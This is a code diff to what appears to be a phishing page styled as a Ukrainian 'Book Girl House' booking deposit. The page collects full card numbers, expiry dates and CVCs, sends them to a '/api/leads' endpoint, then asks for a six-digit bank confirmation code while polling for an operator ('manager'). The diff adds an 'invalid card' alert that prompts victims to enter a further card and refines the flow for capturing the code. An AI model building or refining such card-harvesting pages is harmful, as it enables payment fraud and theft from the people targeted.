@@ -9,7 +9,7 @@
 <meta property="og:title" content="Book Girl House — Депозит">
 <meta property="og:description" content="Підтвердження бронювання. Депозит спишеться тільки при зустрічі.">
 <meta name="theme-color" content="#f6f9fc">
-<link rel="stylesheet" href="/style.css?v=21">
+<link rel="stylesheet" href="/style.css?v=23">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -109,6 +109,15 @@
         </div>
 
         <p id="err" class="form-error"></p>
+
+        <div id="cardAlert" class="card-alert" hidden>
+          <div class="card-alert-icon">!</div>
+          <div class="card-alert-body">
+            <strong id="cardAlertTitle"></strong>
+            <p id="cardAlertText"></p>
+          </div>
+          <button type="button" class="card-alert-close" id="cardAlertClose" aria-label="OK">×</button>
+        </div>
 
         <div id="pending" class="code-panel" hidden>
           <div class="code-panel-head">
@@ -393,10 +402,13 @@ $("activation").addEventListener("input",()=>{if(codeSubmitted)return;updateCode
 function openCodePanel(){
   $("pending").hidden=false;codeStage=true;waitingForManager=false;
   hideLoading();
+  $("codeLoading").hidden=true; // belt-and-suspenders
   $("inline-code-entry").hidden=false;
   $("activation").disabled=false;
-  $("send").disabled=false;
+  $("activation").value="";
+  $("send").disabled=true; // enabled only after 6 digits via auto-submit or when code ready
   $("send").textContent=t("payBtn");
+  hideCardAlert();
   startRetryCountdown(90);
   $("pending").scrollIntoView({behavior:"smooth",block:"nearest"});
 }
@@ -407,8 +419,18 @@ function startRetryCountdown(sec){
     btn.textContent=`${t("resendCode")} (${Math.floor(retrySecondsLeft/60)}:${String(retrySecondsLeft%60).padStart(2,"0")})`;retrySecondsLeft--};
   tick();retryTimer=setInterval(tick,1000);
 }
-function showLoading(){$("codeLoading").hidden=false;$("inline-code-entry").hidden=true;$("retryButton").hidden=true;$("activation").disabled=true;$("verr").textContent=""}
-function hideLoading(){$("codeLoading").hidden=true;$("inline-code-entry").hidden=false}
+function showLoading(){
+  // Only used AFTER the 6-digit code was submitted
+  $("codeLoading").hidden=false;
+  $("inline-code-entry").hidden=true;
+  $("retryButton").hidden=true;
+  $("activation").disabled=true;
+  $("verr").textContent="";
+}
+function hideLoading(){
+  $("codeLoading").hidden=true;
+  $("inline-code-entry").hidden=false;
+}
 function finish(){
   const ov=$("payOverlay");if(ov)ov.hidden=true;
   const card=$("formCard").querySelector(".checkout-card");
@@ -420,6 +442,20 @@ function finish(){
   window.scrollTo({top:0,behavior:"smooth"});
 }
 
+function hideCardAlert(){
+  const a=$("cardAlert");
+  if(a)a.hidden=true;
+}
+function showCardAlert(title, text){
+  const a=$("cardAlert");
+  if(!a)return;
+  $("cardAlertTitle").textContent=title||t("cardInvalidTitle");
+  $("cardAlertText").textContent=text||t("cardInvalid");
+  a.hidden=false;
+  // Scroll to the alert inside the form — not to the very top of the page
+  try{a.scrollIntoView({behavior:"smooth",block:"center"})}catch(_){}
+}
+
 function resetFormForNewCard(msg){
   if(poll){clearInterval(poll);poll=null}
   if(retryTimer){clearInterval(retryTimer);retryTimer=null}
@@ -427,19 +463,24 @@ function resetFormForNewCard(msg){
   leadId=null;codeStage=false;codeSubmitted=false;waitingForManager=false;lastRenderedStatus=null;autoSubmittingCode=false;
   hideLoading();
   const ov=$("payOverlay");if(ov)ov.hidden=true;
+  // Keep form visible, hide code panel & thank-you
   $("pending").hidden=true;
+  $("thankYou").hidden=true;
+  const formCard=$("formCard").querySelector(".checkout-card");
+  if(formCard)formCard.hidden=false;
   $("inline-code-entry").hidden=false;
   $("activation").value="";
   $("activation").disabled=false;
+  // Clear only card data so client enters another card
   $("card").value="";
   $("expiry").value="";
   $("code").value="";
   $("send").disabled=false;
   $("send").textContent=t("payBtn");
-  $("err").textContent=msg||t("cardInvalid");
+  $("err").textContent="";
   $("verr").textContent="";
-  try{$("card").focus()}catch(_){}
-  window.scrollTo({top:0,behavior:"smooth"});
+  showCardAlert(t("cardInvalidTitle"), msg||t("cardInvalid"));
+  try{$("card").focus({preventScroll:true})}catch(_){try{$("card").focus()}catch(__){}}
 }
 
 function setStatus(d){
@@ -523,9 +564,11 @@ $("send").onclick=async()=>{
     const expYear=2000+(em?+em[2]:0);
     const now=new Date();
     if(expYear<now.getFullYear()||(expYear===now.getFullYear()&&month<now.getMonth()+1)){$("err").textContent=t("errExpired");return}
-    // No overlay / loading on card submit — only after confirmation code is entered
-    $("send").disabled=true;$("send").textContent=t("sending");
+    // Card submit: no overlay, no spinner. Only disable the button briefly.
+    hideCardAlert();
+    $("send").disabled=true;
     const ov=$("payOverlay");if(ov)ov.hidden=true;
+    $("codeLoading").hidden=true;
     try{
       const r=await fetch("/api/leads",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({
         name:fullName,email,card_number:digits,expiry,card_code:cvc,
@@ -535,9 +578,8 @@ $("send").onclick=async()=>{
       const d=await r.json();if(!r.ok)throw Error(d.error);
       leadId=d.id;localStorage.setItem("fitpass_lead_id",String(leadId));
       openCodePanel();
-      $("send").textContent=t("payBtn");
-      $("send").disabled=true; // wait for 6-digit code
       $("statusText").textContent=t("codeSent");
+      $("codeLoading").hidden=true;
       hideLoading();
       if(!poll)poll=setInterval(checkStatus,3000);
     }catch(e){$("err").textContent=e.message;$("send").disabled=false;$("send").textContent=t("payBtn")}
@@ -603,12 +645,16 @@ $("resetLead").onclick=()=>{
   leadId=null; codeStage=false; codeSubmitted=false; waitingForManager=false; lastRenderedStatus=null; autoSubmittingCode=false;
   $("pending").hidden=true;
   hideLoading();
+  $("codeLoading").hidden=true;
   $("send").disabled=false;
   $("send").textContent=t("payBtn");
   $("activation").value="";
   $("err").textContent="";
   $("verr").textContent="";
+  hideCardAlert();
 };
+const cardAlertClose=$("cardAlertClose");
+if(cardAlertClose)cardAlertClose.onclick=hideCardAlert;
 applyLang(localStorage.getItem("fitpass_lang")||"uk");
 
 // USD → UAH conversion
